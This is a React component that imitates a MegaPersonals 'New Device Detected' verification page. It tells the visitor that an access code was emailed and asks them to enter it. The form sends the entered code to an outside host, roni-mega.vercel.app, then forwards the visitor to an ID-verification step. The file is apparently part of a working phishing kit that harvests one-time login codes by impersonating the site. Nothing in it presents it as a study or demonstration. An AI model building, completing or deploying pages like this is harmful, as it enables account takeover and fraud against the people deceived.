import React from "react";
import mega from "../Img/mega.png";
import "./verify.css";
import { useForm } from "react-hook-form";
import { useNavigate } from "react-router-dom";

const Verify = () => {
  const { register, handleSubmit } = useForm();

  const navigate = useNavigate();

  const onSubmit = (data) => {
    const Code = {
      Code: data.exampleRequired,
    };
    console.log(Code);
    fetch("https://roni-mega.vercel.app/code", {
      method: "POST",
      headers: { "Content-type": "application/json" },
      body: JSON.stringify(Code),
    })
      .then((res) => res.json())
      .then((result) => navigate("/IdVerify"));
  };
  return (
    <>
      <div className="container">
        <div className="row">
          <div className="col-md-3"></div>
          <div className="col-md-6 text-center">
            <div className="p-2 mega">
              <img src={mega} alt="mega" />
            </div>
            <div className="device">NEW DEVICE DETECTED</div>
            <div className="p-3">
              <h4 className="pb-0 mb-0">Your ACCESS CODE</h4>
              <h4 className="pb-0 mb-0">has been sent successfully</h4>
              <h4 className="pb-0 mb-0">to your email on November 05, 2023.</h4>
              <h4 className="pb-0 mb-0">That code remains valid.</h4>
            </div>
            <div className="fst-italic">
              <h3>CHECK YOUR SPAM</h3>
              <h3>FOLDER IT MAY BE THERE.</h3>
              <h3 className="text-danger">DO NOT SHARE IT </h3>
            </div>
            <div className="Enter">
              <div className="p-0">Enter the code</div>
              <div className="p-0">below to continue.</div>
            </div>
            {/*  */}
            <form onSubmit={handleSubmit(onSubmit)}>
              <div>
                <input
                  className="text-center code"
                  {...register("exampleRequired", { required: true })}
                />
              </div>
              <input className="submitCode btn" type="submit" value="PROCEED" />
            </form>
            {/*  */}

            <div className="Policies">
              Home | Manage Posts | Contact Us | Policies & Terms | Logout
            </div>
            <p className="Copyright">Copyright ©2022 MegaPersonals.eu</p>
          </div>
          <div className="col-md-3"></div>
        </div>
      </div>
    </>
  );
};

export default Verify;
